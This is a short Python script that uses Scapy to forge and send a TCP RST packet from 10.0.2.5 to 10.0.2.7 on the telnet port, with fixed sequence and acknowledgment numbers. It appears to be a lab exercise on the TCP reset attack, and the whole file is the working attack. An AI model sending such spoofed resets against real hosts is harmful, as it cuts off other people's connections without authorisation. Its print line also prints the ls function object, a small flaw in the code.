#!/usr/bin/python
from scapy.all import *
from scapy.layers.inet import IP, TCP

ip = IP(src="10.0.2.5", dst="10.0.2.7")

tcp = TCP(sport=278, dport=23, flags="R", seq=8975, ack=89007)
pkt = ip/tcp
ls(pkt)
print(ip, tcp, ls)
send(pkt)